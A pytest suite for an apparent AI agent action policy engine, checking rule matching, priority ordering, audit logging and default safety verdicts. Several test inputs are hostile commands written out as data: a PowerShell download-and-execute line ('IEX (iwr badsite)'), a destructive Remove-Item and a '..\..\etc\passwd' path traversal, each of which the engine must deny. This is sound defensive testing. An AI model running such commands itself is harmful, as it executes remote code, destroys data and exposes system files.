"""Pytest suite for OpenClaw action safety policy engine."""

import sys
from pathlib import Path

OPENCLAW_DIR = Path(__file__).resolve().parents[2] / "services" / "openclaw"
OPENCLAW_APP_DIR = OPENCLAW_DIR / "app"
if str(OPENCLAW_DIR) not in sys.path:
    sys.path.insert(0, str(OPENCLAW_DIR))
if str(OPENCLAW_APP_DIR) not in sys.path:
    sys.path.insert(0, str(OPENCLAW_APP_DIR))

try:
    import app as _app_pkg  # type: ignore
    if hasattr(_app_pkg, "__path__") and str(OPENCLAW_APP_DIR) not in _app_pkg.__path__:
        _app_pkg.__path__.append(str(OPENCLAW_APP_DIR))
except Exception:
    pass

from app.policy_engine import (
    ActionVerdict,
    PolicyEngine,
    PolicyRule,
    default_safety_rules,
)


def test_s1_verdict_enum_completeness():
    assert len(ActionVerdict) == 3
    assert {v.value for v in ActionVerdict} == {"allow", "confirm", "deny"}


def test_s2_action_matching_exact_case_insensitive():
    rule = PolicyRule(name="r", verdict=ActionVerdict.ALLOW, action_pattern=r"shell\.run")
    assert rule.matches("shell.run", {}, {})
    assert rule.matches("SHELL.RUN", {}, {})
    assert rule.matches("Shell.Run", {}, {})
    assert not rule.matches("shell.run.x", {}, {})


def test_s3_arg_pattern_matching():
    rule = PolicyRule(
        name="r",
        verdict=ActionVerdict.DENY,
        action_pattern=r"shell\.run",
        arg_patterns={"command": r"(?i)Remove-Item"},
    )
    assert rule.matches("shell.run", {"command": "Remove-Item X"}, {})
    assert rule.matches("shell.run", {"command": "remove-item X"}, {})
    assert not rule.matches("shell.run", {"command": "Get-ChildItem"}, {})


def test_s4_mode_filter():
    rule = PolicyRule(
        name="r",
        verdict=ActionVerdict.CONFIRM,
        action_pattern=r".*",
        mode_filter={"conversation"},
    )
    assert rule.matches("any", {}, {"mode": "conversation"})
    assert not rule.matches("any", {}, {"mode": "operator"})


def test_s5_default_verdict_when_no_rules_match():
    engine = PolicyEngine(rules=[], default_verdict=ActionVerdict.DENY)
    decision = engine.evaluate("unknown.action", trace_id="s5")
    assert decision.verdict == ActionVerdict.DENY
    assert decision.rule_name == "__default__"


def test_s6_first_match_wins():
    engine = PolicyEngine(
        rules=[
            PolicyRule(name="first", verdict=ActionVerdict.ALLOW, action_pattern=r".*", priority=10),
            PolicyRule(name="second", verdict=ActionVerdict.DENY, action_pattern=r".*", priority=20),
        ]
    )
    decision = engine.evaluate("x", trace_id="s6")
    assert decision.verdict == ActionVerdict.ALLOW
    assert decision.rule_name == "first"


def test_s7_priority_ordering():
    engine = PolicyEngine(
        rules=[
            PolicyRule(name="low", verdict=ActionVerdict.ALLOW, action_pattern=r".*", priority=99),
            PolicyRule(name="high", verdict=ActionVerdict.DENY, action_pattern=r".*", priority=1),
        ]
    )
    decision = engine.evaluate("x", trace_id="s7")
    assert decision.verdict == ActionVerdict.DENY


def test_s8_audit_log_recording():
    engine = PolicyEngine(
        rules=[PolicyRule(name="r", verdict=ActionVerdict.ALLOW, action_pattern=r".*")]
    )
    engine.evaluate("a1", trace_id="s8a")
    engine.evaluate("a2", trace_id="s8b")
    assert engine.decision_count == 2
    assert engine.recent_decisions(1)[0]["trace_id"] == "s8b"


def test_s9_rule_add_remove():
    engine = PolicyEngine()
    engine.add_rule(PolicyRule(name="x", verdict=ActionVerdict.DENY, action_pattern=r".*"))
    assert engine.rule_count == 1
    engine.remove_rule("x")
    assert engine.rule_count == 0


def test_s10_default_rules_deny_destructive_shell():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate("shell.run", args={"command": "Remove-Item S:\\foo"}, trace_id="s10a")
    assert decision.verdict == ActionVerdict.DENY
    decision = engine.evaluate("shell.run", args={"command": "IEX (iwr badsite)"}, trace_id="s10b")
    assert decision.verdict == ActionVerdict.DENY


def test_s11_default_rules_deny_path_escape():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate("file.write", args={"path": "C:\\evil.txt"}, trace_id="s11a")
    assert decision.verdict == ActionVerdict.DENY
    decision = engine.evaluate("file.read", args={"path": "..\\..\\etc\\passwd"}, trace_id="s11b")
    assert decision.verdict == ActionVerdict.DENY


def test_s12_default_rules_allow_readonly():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate("shell.run", args={"command": "Get-ChildItem S:\\"}, trace_id="s12a")
    assert decision.verdict == ActionVerdict.ALLOW
    decision = engine.evaluate("file.read", args={"path": "S:\\config\\x.json"}, trace_id="s12b")
    assert decision.verdict == ActionVerdict.ALLOW


def test_s13_default_rules_confirm_writes():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate("file.write", args={"path": "S:\\tmp\\x.txt"}, trace_id="s13a")
    assert decision.verdict == ActionVerdict.CONFIRM
    decision = engine.evaluate("browser.open", args={"url": "https://x.com"}, trace_id="s13b")
    assert decision.verdict == ActionVerdict.CONFIRM


def test_s14_policy_decision_serialization():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate("file.read", args={"path": "S:\\x"}, trace_id="s14")
    data = decision.to_dict()
    assert data["verdict"] == "allow"
    assert data["trace_id"] == "s14"
    assert "timestamp" in data


def test_s15_args_summary_truncation():
    engine = PolicyEngine(rules=default_safety_rules())
    decision = engine.evaluate(
        "file.write",
        args={"content": "x" * 200, "path": "S:\\tmp\\x"},
        trace_id="s15",
    )
    assert len(str(decision.args_summary.get("content", ""))) <= 121
